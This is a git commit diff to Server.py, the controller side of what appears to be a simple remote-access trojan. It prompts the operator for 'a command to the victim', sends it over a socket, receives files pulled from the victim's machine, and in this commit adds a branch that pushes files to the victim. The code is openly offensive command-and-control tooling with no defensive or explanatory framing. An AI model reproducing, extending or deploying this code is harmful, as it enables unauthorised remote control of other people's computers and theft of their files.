8cdb7c827f4da47f4ba477a2521c55e714ce51be
yehonatan1 <54950358+yehonatan1@users.noreply.github.com>
2020-02-18 15:13:56 +0200

    Update Server.py

--- Server.py
+++ Server.py
@@ -10,29 +10,38 @@ def server():
     print("Connection from: " + str(adress))
 
     while True:
-        command = input('Please enter a command to the victim')
+        command = input('Please enter a command to the victim\n')
         client_socket.send(command.encode('utf-8'))
         if 'get file ' in command:
-            print('Get File')
             data = None
-            file_path = input(
-                "Please enter the path of the file")
+            file_path = input("Please enter the path of the file\n")
             with open(file_path, 'wb')as f:
                 print('Open File')
-                size = 0
                 while True:
                     data = client_socket.recv(1024)
-                    size += len(data)
-                    print(f'Size is {size} and last amount was {len(data)}')
                     if not data or len(data) < 1024:
-                        print('Done getting file')
                         f.write(data)
                         f.flush()
                         f.close()
                         break
                     f.write(data)
+        elif 'download file ' in command:
+            command = command.replace('download file ', '')
+            print('hey')
+            f = open(command, 'rb')
+            while True:
+                content = f.read(1024)
+                if content:
+                    client_socket.sendall(content)
+                else:
+                    f.close()
+                    break
+
+
+
+
         else:
-            data = client_socket.recv(1024)
+            data = client_socket.recv(1024).decode('utf-8')
             print(data)
 
     client_socket.close()
